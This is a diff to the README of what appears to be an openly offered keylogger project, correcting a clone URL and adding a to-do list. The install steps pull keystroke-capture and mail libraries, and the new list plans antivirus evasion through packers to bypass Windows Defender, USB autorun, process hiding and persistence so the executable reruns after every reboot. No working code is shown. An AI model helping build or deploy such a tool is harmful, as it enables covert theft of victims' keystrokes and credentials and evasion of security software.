@@ -26,8 +26,23 @@ sudo apt-get install python3-pip
 pip install pynput
 pip install secure-smtplib
 pip install PyMails
-git clone https://github.com/Binary-Assasin/keylogger
+git clone https://github.com/Binary-Assassin/keylogger
 ```
 [-] still not finding libraries refer to
 
     https://pypi.org/search/
+
+
+
+# Remainings
+
+make it commpatible to windows
+the code should be able to access the powershell of the windows
+obfscation py->exe->packers(bypass windows defender)
+autorun script for USB plugin
+Enhancement of the keylogger its mailing system is perfect for long-term implementation on cloud or research about it
+hidding exe process
+exe file br br run ho jab jab bhi pc shutdown hokr on ho
+
+
+
